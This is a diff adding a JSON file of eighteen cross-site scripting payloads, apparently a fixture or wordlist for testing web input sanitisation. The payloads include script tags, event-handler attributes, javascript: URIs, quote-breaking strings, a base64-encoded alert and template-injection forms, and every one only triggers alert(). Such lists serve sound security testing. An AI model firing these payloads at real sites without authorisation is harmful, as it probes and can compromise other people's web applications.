@@ -1,0 +1,74 @@
+[
+  {
+    "id": "fragment-0",
+    "payload": "<script>alert(\"xss\")</script>"
+  },
+  {
+    "id": "fragment-1",
+    "payload": "<img src=x onerror=alert(\"xss\")>"
+  },
+  {
+    "id": "fragment-2",
+    "payload": "<svg onload=alert(\"xss\")>"
+  },
+  {
+    "id": "fragment-3",
+    "payload": "<body onload=alert(\"xss\")>"
+  },
+  {
+    "id": "fragment-4",
+    "payload": "<iframe src=\"javascript:alert(1)\">"
+  },
+  {
+    "id": "fragment-5",
+    "payload": "<details open ontoggle=alert(1)>"
+  },
+  {
+    "id": "fragment-6",
+    "payload": "<marquee onstart=alert(1)>"
+  },
+  {
+    "id": "fragment-7",
+    "payload": "<input onfocus=alert(1) autofocus>"
+  },
+  {
+    "id": "fragment-8",
+    "payload": "<select onfocus=alert(1) autofocus>"
+  },
+  {
+    "id": "fragment-9",
+    "payload": "<textarea onfocus=alert(1) autofocus>"
+  },
+  {
+    "id": "fragment-10",
+    "payload": "<video><source onerror=alert(1)>"
+  },
+  {
+    "id": "fragment-11",
+    "payload": "<audio src=x onerror=alert(1)>"
+  },
+  {
+    "id": "fragment-12",
+    "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>"
+  },
+  {
+    "id": "fragment-13",
+    "payload": "'-alert(1)-'"
+  },
+  {
+    "id": "fragment-14",
+    "payload": "<img src=x onerror=\"atob('YWxlcnQoMSk=')\">"
+  },
+  {
+    "id": "fragment-15",
+    "payload": "{{constructor.constructor(\"alert(1)\")()}}"
+  },
+  {
+    "id": "fragment-16",
+    "payload": "${alert(1)}"
+  },
+  {
+    "id": "fragment-17",
+    "payload": "<svg/onload=alert(1)//>"
+  }
+]
